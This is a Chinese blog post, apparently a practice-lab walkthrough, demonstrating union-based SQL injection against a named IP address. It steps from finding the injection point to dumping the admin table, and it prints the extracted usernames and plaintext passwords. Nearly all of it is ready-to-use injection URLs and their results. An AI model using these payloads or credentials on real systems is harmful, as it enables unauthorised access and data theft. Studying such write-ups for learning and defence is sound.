title: sql注入得到数据库的用户名和密码
author: weizhao
tags:
  - sql注入
categories: []
date: 2021-03-08 22:15:00
---
# 确定注入点

* 当输入
http://59.63.200.79:8003/?id=1%20and%201=1 
时网站显示正常
* 当输入
http://59.63.200.79:8003/?id=1%20and%201=2
时网站显示不正常，判断注入点在此。

# 确定网站的回传的字段数

* 输入 
http://59.63.200.79:8003/?id=1%20and%201=1%20order%20by%201 
网站显示正常，结尾用order by 2 时仍显示正常，当使用order by 3 时页面显示不正常，判断网站包含两个字段。

# 确定回显点

* 输入
http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,2
时页面显示出来2，确定了回显地点。

# 确定数据库名称

* 输入
http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,database()
出现当前数据库的名称：maoshe
# 确定当前数据库包含的表

* 输入
http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1 
返回当前数据库包含的第一个表名：admin。
* 输入 
http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%201,1 
页面异常，表示当前数据库只包含一个表。

**_limit用法_**
* LIMIT后的第一个参数是输出记录的初始位置，第二个参数偏移量，偏移多少，输出的条目就是多少。
# 确定当前数据库表包含的列名
* 输入
http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%200,1 
得到第一列的名称为：Id
* 输入
http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%
20and%20table_name=%27admin%27%20limit%201,1 
得到第二列的名称为：username 
* 输入
http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%202,1 
得到第三列的名称为：password 
* 输入limit 3,1时页面异常，说明admin表只包含三列。
# 确定当前表记录的用户
* 输入
http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20from%20admin%20limit%200,1 
得到第一个用户为admin
* 输入
http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%201,1
得到第二个用户为：ppt领取微信 。
* 输入
http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%202,1
页面异常，说明只包含两个用户。
# 确定用户的密码

* 输入
http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20from%20admin%20limit%200,1 
得到admin用户的密码为：hellohack 
* 输入 
http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20%20from%20admin%20limit%201,1 
得到第二个用户的密码为：zkaqbanban 



